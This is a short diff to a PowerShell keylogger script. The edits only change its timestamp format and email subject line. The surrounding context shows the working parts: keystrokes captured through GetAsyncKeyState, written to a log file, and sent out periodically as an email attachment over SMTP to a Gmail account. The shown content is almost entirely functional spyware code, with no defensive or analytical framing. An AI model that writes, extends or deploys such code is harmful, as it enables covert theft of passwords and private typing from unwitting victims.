@@ -21,7 +21,7 @@ public static extern short GetAsyncKeyState(int virtualKeyCode);
 $getKeyState = Add-Type -memberDefinition $signature -name "Newtype" -namespace newnamespace -passThru
 
 $startDate = Get-Date
-$sDate = Get-Date -Format "MM/dd/yyyy - HH:mm:ss"
+$sDate = Get-Date -Format "MM/dd/yyyy-HH:mm:ss"
 Set-Content $path "Keylog"
 Add-Content $path $sDate
 Add-Content $path ""
@@ -46,13 +46,13 @@ while($true){
       $ReportEmail = New-Object System.Net.Mail.MailMessage
       $ReportEmail.From = $gmail
       $ReportEmail.To.Add($gmail)
-      $ReportEmail.Subject = 'Keylog - ' + $sDate + '-' + $eDate
+      $ReportEmail.Subject = 'Keylog: ' + $sDate + ' >> ' + $eDate
       $ReportEmail.Attachments.Add($path)
       $SMTPInfo.Send($ReportEmail)
       $ReportEmail.Dispose()
     }
     $startDate = Get-Date
-    $sDate = Get-Date -Format "MM/dd/yyyy - HH:mm:ss"
+    $sDate = Get-Date -Format "MM/dd/yyyy-HH:mm:ss"
     Set-Content $path "Keylog"
     Add-Content $path $sDate
     Add-Content $path ""
